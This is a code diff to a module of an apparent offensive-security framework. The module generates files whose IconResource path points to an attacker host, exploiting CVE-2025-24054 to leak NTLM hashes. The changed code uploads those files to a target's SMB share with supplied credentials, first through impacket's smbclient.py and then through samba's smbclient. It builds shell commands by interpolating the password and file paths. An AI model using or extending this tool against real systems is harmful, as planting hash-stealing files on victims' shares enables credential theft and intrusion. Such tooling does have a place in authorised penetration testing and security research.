@@ -11,6 +11,7 @@ import os
 import glob
 import struct
 import zipfile
+import tempfile
 from core.module_base import ModuleBase, ModuleType, Platform, find_tool
 
 
@@ -336,7 +337,7 @@ IconResource=\\\\{lhost}\\share\\icon.ico,0
             f.write(lnk_data)
 
     def _upload_files(self, files: list) -> None:
-        """Upload generated files to target share"""
+        """Upload generated files to target share using impacket's smbclient.py"""
         target = self.get_option("RHOSTS")
         share = self.get_option("SHARE")
         remote_path = self.get_option("REMOTE_PATH")
@@ -351,12 +352,7 @@ IconResource=\\\\{lhost}\\share\\icon.ico,0
         self.print_line()
         self.print_status(f"Uploading to \\\\{target}\\{share}...")
 
-        # Build auth for smbclient (not impacket's smbclient.py)
-        if domain:
-            auth = f"{domain}/{user}%{password}"
-        else:
-            auth = f"{user}%{password}"
-
+        # Use impacket's smbclient.py (more reliable with NTLM auth)
         for filepath in files:
             filename = os.path.basename(filepath)
 
@@ -366,41 +362,73 @@ IconResource=\\\\{lhost}\\share\\icon.ico,0
             else:
                 remote_file = filename
 
-            # Use smbclient (samba) for upload - more reliable
-            cmd = f"smbclient '//{target}/{share}' -U '{auth}' -c 'put {filepath} {remote_file}'"
+            success = self._upload_with_impacket(target, share, user, password, domain, filepath, remote_file)
 
-            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=30)
-
-            if ret == 0 and "NT_STATUS" not in stderr:
-                self.print_good(f"  Uploaded: {filename}")
-            else:
-                # Try with impacket's smbclient.py using echo pipe
-                self._upload_with_impacket(target, share, user, password, domain, filepath, remote_file)
+            if not success:
+                # Fallback to samba's smbclient
+                self._upload_with_smbclient(target, share, user, password, domain, filepath, remote_file)
 
     def _upload_with_impacket(self, target: str, share: str, user: str, password: str,
-                               domain: str, local_path: str, remote_file: str) -> None:
-        """Upload using impacket's smbclient.py with echo pipe"""
+                               domain: str, local_path: str, remote_file: str) -> bool:
+        """Upload using impacket's smbclient.py"""
         filename = os.path.basename(local_path)
 
-        # Build impacket auth string
+        # Build impacket auth string with proper quoting
         if domain:
-            auth = f"{domain}/{user}:{password}@{target}"
+            auth = f"'{domain}/{user}':'{password}'@{target}"
         else:
-            auth = f"{user}:{password}@{target}"
+            auth = f"'{user}':'{password}'@{target}"
 
-        # Use echo to pipe commands to smbclient.py
-        cmd = f"echo -e 'use {share}\\nput {local_path} {remote_file}\\nexit' | smbclient.py '{auth}'"
+        # Create a temp script file to avoid shell escaping issues
+        script_content = f"use {share}\nput {local_path} {remote_file}\nexit\n"
+
+        try:
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+                f.write(script_content)
+                script_path = f.name
+
+            # Run smbclient.py with input from file
+            cmd = f"smbclient.py {auth} < {script_path}"
+            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
+
+            # Clean up
+            os.unlink(script_path)
+
+            # Check for success - look for the file in output or no errors
+            output = stdout + stderr
+            if ret == 0 and "error" not in output.lower() and "STATUS_" not in output:
+                self.print_good(f"  Uploaded: {filename}")
+                return True
+            elif "putting file" in output.lower() or remote_file in output:
+                self.print_good(f"  Uploaded: {filename}")
+                return True
+            else:
+                return False
+
+        except Exception as e:
+            self.print_error(f"  Impacket upload error: {e}")
+            return False
+
+    def _upload_with_smbclient(self, target: str, share: str, user: str, password: str,
+                                domain: str, local_path: str, remote_file: str) -> bool:
+        """Fallback upload using samba's smbclient"""
+        filename = os.path.basename(local_path)
+
+        # Build auth for smbclient
+        if domain:
+            auth = f"{domain}/{user}%{password}"
+        else:
+            auth = f"{user}%{password}"
+
+        cmd = f"smbclient '//{target}/{share}' -U '{auth}' -c 'put {local_path} {remote_file}'"
         ret, stdout, stderr = self.run_in_exegol(cmd, timeout=30)
 
-        if ret == 0 and "error" not in stderr.lower():
+        if ret == 0 and "NT_STATUS" not in stderr:
             self.print_good(f"  Uploaded: {filename}")
+            return True
         else:
             self.print_error(f"  Failed: {filename}")
-            # Show error details
-            if stderr and "error" in stderr.lower():
-                for line in stderr.split('\n'):
-                    if line.strip():
-                        self.print_error(f"    {line.strip()}")
+            return False
 
     def _generate_cve_2025_24054(self, lhost: str, filename: str, output_dir: str, share_name: str) -> bool:
         """
